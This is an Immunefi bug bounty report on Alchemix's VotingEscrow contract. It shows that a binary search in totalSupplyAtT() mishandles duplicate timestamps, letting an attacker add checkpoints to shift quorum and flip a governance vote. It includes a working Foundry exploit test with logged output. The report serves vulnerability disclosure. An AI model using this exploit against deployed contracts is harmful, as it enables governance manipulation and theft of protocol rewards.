# 30655 - \[SC - Critical] Binary search does not correctly handle duplica...

Submitted on May 3rd 2024 at 05:25:10 UTC by @Holterhus for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30655

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

Throughout the `VotingEscrow` contract, there are several functions that conduct a binary search to determine the first entry containing a timestamp that's before or equal to a target timestamp. In some of these functions, the binary search does not deterministically handle the scenario where multiple exact matches exist. By strategically checkpointing multiple times on a given timestamp, an attacker can inflate the relative amount of power the system considers them to have. This behavior can be abused to change the results of a governance proposal, or to receive more rewards than intended.

## Vulnerability Details

The `totalSupplyAtT()` function has the following binary search implementation:

```solidity
if (t < lastPoint.ts) {
    uint256 lower = 0;
    uint256 upper = _epoch - 1;

    while (upper > lower) {
        uint256 center = upper - (upper - lower) / 2;
        lastPoint = pointHistory[center];
        if (lastPoint.ts == t) {
            lower = center;
            break;
        } else if (lastPoint.ts < t) {
            lower = center;
        } else {
            upper = center - 1;
        }
    }

    lastPoint = pointHistory[lower];
}
```

Notice that in this function, the binary search is instantly concluded when a match is found. This behavior means that `totalSupplyAtT()` can potentially return *any* of the exact matches in the `pointHistory` mapping. This is incorrect. An example of a correct implementation would be something similar to `_balanceOfTokenAt()`, which always returns the "right-most" (i.e. most recent) exact match.

This would not be a problem if each entry had a unique timestamp. However, there *can* be duplicate timestamps in the `pointHistory` entries (for example, notice how `_checkpoint()` will always increase `_epoch` by 1). On the other hand there *can't* be duplicate timestamps in the`checkpoints` mapping (for example, see the `_findWhatCheckpointToWrite()` function).

So, in the case of an exact timestamp match, the `getPastVotes()` and `balanceOfTokenAt()` functions always return the state when the timestamp ended, but the `totalSupplyAtT()` function can return any of the states from that timestamp. This leads to incorrect results in places that compare values from both functions (e.g. in the `claimable()` calculation in the `RevenueHandler`, or the `_quorumReached()` function in the `AlchemixGovernor`)

## Impact Details

Consider, for example, the following scenario:

* A proposal in the `AlchemixGovernor` has a snapshot timestamp at time `t`.
* At exactly time `t`, an attacker calls `checkpoint()` and then `createLock()` in the `VotingEscrow` contract.
* There are now two entries in `pointHistory` at timestamp `t` - one with the increased supply from `createlock()`, and one with the original supply.
* The `totalSupplyAtT()` function can return either one depending on the number of epochs. The attacker can force the original supply to be returned by arbitrarily adding more checkpoints (to change the result of the binary search).
* Now, the `_quorum()` value can be arbitrarily changed by calling `checkpoint()`. This means the governance can consider some proposals to have reached quorum, even though they did not.

Other than this, it appears that `RevenueHandler` logic can be tricked into giving a user too many tokens (more than 100% of the entire epoch even).

## References

See the proof of concept below.

## Proof of Concept

I've created the following test case which can be added to the `AlchemixGovernorTest` contract:

```solidity
function testBinarySearchExploit() public {
    /******************************************************************* 
    *    Step 1: someone makes a proposal
    ********************************************************************/
    assertFalse(voter.isWhitelisted(usdc));

    (address[] memory t, uint256[] memory v, bytes[] memory c, string memory d) = craftTestProposal();
    hevm.warp(block.timestamp + 2 days); // delay

    hevm.startPrank(admin);
    uint256 pid = governor.propose(t, v, c, d, MAINNET);
    uint256 proposalSnapshot = governor.proposalSnapshot(pid);
    address attacker = address(uint160(uint256(bytes32(keccak256("attacker")))));

    /*******************************************************************
    *    Step 2: the proposal snapshot timestamp arrives,
    *    attacker does the exploit
    ********************************************************************/
    hevm.roll(block.number + 1);
    hevm.warp(proposalSnapshot);

    uint256 quorumEstimate = governor.quorum(proposalSnapshot);
    veALCX.checkpoint();
    createVeAlcx(attacker, quorumEstimate * 55 / 100, MAXTIME, false);

    /******************************************************************* 
    *    Step 3: the voting period starts now, the quorum is broken
    ********************************************************************/
    hevm.roll(block.number + 1);
    hevm.warp(block.timestamp + governor.votingDelay() + 1);

    // Notice that the quorum can be changed by adding new checkpoints.
    // This is just for demonstration purposes. Doing exactly 5 checkpoints gets the attacker
    // back to the larger value (which out of their favor).
    for (uint256 i; i < 5; ++i) {
        veALCX.checkpoint();
        uint256 votingPower = veALCX.getPastVotes(attacker, proposalSnapshot);
        uint256 quorum = governor.quorum(proposalSnapshot);
        console2.log("votingPower:", votingPower);
        console2.log("quorum:", quorum);
        console2.log("attacker has enough voting power:", votingPower >= quorum);
        console2.log("-----------------------");
    }

    hevm.startPrank(attacker);
    governor.castVote(pid, 1);
    hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
    hevm.stopPrank();

    // Currently the vote has failed
    console2.log("Result before:", uint8(governor.state(pid)));

    // But checkpointing now will make it have succeeded
    veALCX.checkpoint();
    console2.log("Result after:", uint8(governor.state(pid)));

    // So now it can actually be executed despite not reaching quorum
    hevm.startPrank(admin);
    hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
    governor.execute(t, v, c, keccak256(bytes(d)), MAINNET);
    hevm.stopPrank();

    assertTrue(voter.isWhitelisted(usdc));
}
```

By running `forge test --rpc-url <ETH_RPC_URL> --match-test testBinarySearchExploit -vvv` I get the following output:

```
[PASS] testBinarySearchExploit() (gas: 2244701)
Logs:
  votingPower: 42574534183000734522912
  quorum: 39346923145662095306947
  attacker has enough voting power: true
  -----------------------
  votingPower: 42574534183000734522912
  quorum: 39346923145662095306947
  attacker has enough voting power: true
  -----------------------
  votingPower: 42574534183000734522912
  quorum: 39346923145662095306947
  attacker has enough voting power: true
  -----------------------
  votingPower: 42574534183000734522912
  quorum: 47861829982262242211529
  attacker has enough voting power: false
  -----------------------
  votingPower: 42574534183000734522912
  quorum: 47861829982262242211529
  attacker has enough voting power: false
  -----------------------
  Result before: 3
  Result after: 4
```

which shows that a governance proposal can have its result manipulated.
